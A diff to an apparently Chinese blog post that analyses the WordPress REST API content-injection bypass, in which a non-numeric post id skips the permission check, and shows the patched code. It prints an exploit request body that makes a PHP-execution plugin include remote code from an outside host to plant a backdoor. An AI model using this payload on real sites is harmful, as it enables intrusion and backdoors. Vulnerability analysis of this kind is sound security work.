@@ -135,7 +135,7 @@ Content-Length: 23
 
 `/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php`
 
-{% highlight php %}
+
 
 register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)', array(
             array(
@@ -165,7 +165,7 @@ register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)'
             'schema' => array( $this, 'get_public_item_schema' ),
         ) );
         
-{% endhighlight %}
+
 
 这段函数的功能是注册REST API的路由，使用正则
 
@@ -192,10 +192,9 @@ register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)'
 那么如何利用呢？审查回调函数注意到有这样两个方法，分别是<kbd>update_item</kbd>和它的权限检查方法<kbd>update_item_permissions_check</kbd>。先来看看
 <kbd>update_item_permissions_check</kbd>
 
-{% highlight php %}
+
 
 public function update_item_permissions_check( $request ) {
-
         $post = get_post( $request['id'] );
         $post_type = get_post_type_object( $this->post_type );
 
@@ -218,11 +217,11 @@ public function update_item_permissions_check( $request ) {
         return true;
     }
     
-{% endhighlight %}
+
 
 不难发现唯一一处限制参数<kbd>id</kbd>的就是第一条<kbd>if</kbd>语句,只要将<kbd>$post</kbd>置为空，函数就会<kbd>return true</kbd>,成功绕过权限检查。跟进<kbd>get_post</kbd>方法。
 
-{% highlight php %}
+
 
 function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {  
     if ( empty( $post ) && isset( $GLOBALS['post'] ) )
@@ -246,11 +245,11 @@ function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {
     if ( ! $_post )
         return null;
         
-{% endhighlight %}
+
 
 调用了wp-post中的<kbd>get_instance</kbd>方法，再次跟进
 
-{% highlight php %}
+
 
 public static function get_instance( $post_id ) {
         global $wpdb;
@@ -278,13 +277,13 @@ public static function get_instance( $post_id ) {
         return new WP_Post( $_post );
     }
     
-{% endhighlight %}
+
 
 分析第一条<kbd>if</kbd>语句可以得知，当<kbd>$post_id</kbd>不是纯数字时，该方法返回<kbd>false</kbd>导致<kbd>get_post</kbd>方法返回<kbd>null</kbd>，这样一来<kbd>update_item_permissions_check</kbd>方法中的$post为空，至此，成功绕过权限检查。
 
 再来看<kbd>update_item</kbd>方法
 
-{% highlight php %}
+
 
     public function update_item( $request ) {
         $id = (int) $request['id'];
@@ -292,7 +291,7 @@ public static function get_instance( $post_id ) {
         $comment = get_comment( $id );
         ......
         
-{% endhighlight %}
+
 
 在这里参数<kbd>id</kbd>被直接转为了<kbd>int</kbd>型,这里演示一下这样会造成什么结果。
 
@@ -309,11 +308,11 @@ public static function get_instance( $post_id ) {
 
 如果存在漏洞的WordPress安装了如 <kbd>insert_php</kbd>,<kbd>exec_php</kbd>等允许页面执行PHP代码的插件，可以构造数据包上传
 
-{% highlight html %}
+
 
 content<spanclass="token punctuation">:</span>"<span class="tokenpunctuation">[</span>insert_php<span class="tokenpunctuation">]</span> <span class="tokenkeyword">include</span><span class="tokenpunctuation">(</span>'http<span class="tokenpunctuation">[</span><span class="tokenpunctuation">:</span><span class="tokencomment">]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}  </span>
 
-{% endhighlight %}
+
 
 木马被插件当做PHP代码执行，导致植入后门。
 
@@ -322,7 +321,7 @@ content<spanclass="token punctuation">:</span>"<span class="tokenpunctuation">[<
 
 修复前：
 
-{% highlight bash lineno %}
+
 
 public static function get_instance( $post_id ) {
         global $wpdb;
@@ -331,13 +330,12 @@ public static function get_instance( $post_id ) {
             return false;
         }
         
-{% endhighlight %}
+
 
 修复后：
 
 
-
-    public static function get_instance( $post_id ) {
+public static function get_instance( $post_id ) {
         global $wpdb;
 
         if ( !$post_id ) {
